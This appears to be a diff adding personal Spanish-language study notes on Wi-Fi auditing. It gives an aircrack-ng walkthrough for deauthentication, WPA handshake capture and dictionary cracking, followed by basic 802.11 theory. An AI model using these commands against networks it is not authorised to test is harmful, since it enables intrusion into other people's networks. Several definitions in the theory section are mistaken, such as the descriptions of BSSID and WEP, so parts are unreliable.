@@ -1,0 +1,69 @@
+
+	--- * Wifii * ---
+
+	## Auditorias Wifi##
+	- Herramientas:
+		* aircrack-ng (manual)
+			# aitmon-ng check kill 		//para elminar procesos que impidan poner el modo monitor
+			> Descubrimiento d eredes wiffi
+				# airmon-ng start [interface-name] 		// para poner la tarjeta de red indicada en modo monitor
+				# airodump-ng [interface-name-monitori-mode] 		//buscar redes inalambricas
+			> Ataque de desautentificacion
+				# iwconfig [interface-name-monitori-mode] channel [nº-wifi-to-desauth]			// configuracion de la tarjeta en el canal de la red wiffi a deautenticar
+				# aireplay-ng --deauth [nº-paqutes(50)] -a [BBID-to-hack] [interface-name-monitori-mode] 		//ataque de desautentificaccion contra toda la red
+			> Captura de handshake
+				# airodump-ng -c [nº-wifi-to-desauth] --bssid [BBID-to-hack] -w [file-to-save] [interface-name-monitori-mode]	// sniffing de paquetes de un AP en concreto y almacenado en un archivo
+				# Deautenticar AP 
+				# Esperar para que se reconecte
+				# La contraseña queda almacenada cifrada en el archivo especificado
+			> Crackear contraseña
+				# aircrack-ng -w [path-dictionary] -b [BBID-to-hack] [captura.pcap]		// Crackeo de contraseñas usando diccionario a partir de la captura de handshake
+		* mdk3 (manual)
+		* airgeddon (Automatica)
+			> Descargar dsde github
+			> Arrancar
+				./airgedon.sh
+			> Es un bash basado en aircrack-ng y otras herraminetas
+			> Tiene un menu de opciones
+	- Tienda de targetas de red:
+		* alfa networks
+		* wifisky 
+		
+	## Teoria ##
+	- Standar Wifi 802.11
+	- SSID: 
+		* transmitido en todos los paquetes del segmento de red
+		* es publico
+	- BSSID: es el SSID de las redes ad-hoc
+	- ESSID: el SSID en las redes con AP
+	- Modos de funcionamiento:	
+		* AP o Infraestructura:
+		* WDS (Wireless Distribution System)
+		* WDS con AP
+		* Repeater (Ranger Extender)
+		* Wireless Client
+	- Deteccion de Redes:
+		* Mediante Beacoms Frames: 
+			> Paquetes transmitidos periodicamente que contiene MAC y SSID
+		* Exploracion de los canales
+		* Creacion de listados disponibles
+	- Paquetes:
+		* Mascos de Administracio
+			> Mantener la comunicacion entre los AP y los clientes inalambricos
+			> Auth
+			> Association Resquest
+			> Assosiation Respones
+			> Beacoms
+			> PRobe Request
+		* Marcos de Control: Garantizan el intercambio adecuado entre AP y clientes
+			> Request to Sender (RTS) => Solicitud d eenvio
+			> Clear to Send ()CTS => Libre para enviar
+			> ACK => Confirmacion
+		* Marcos de Datos: Transportan los datos reales de la comunicacio establecida
+	- Tipos de autentificacion
+		* Abierto
+		* Clave compartida:
+			> WEB
+			> WPA-PSK
+			> WPA2-PSK
+		
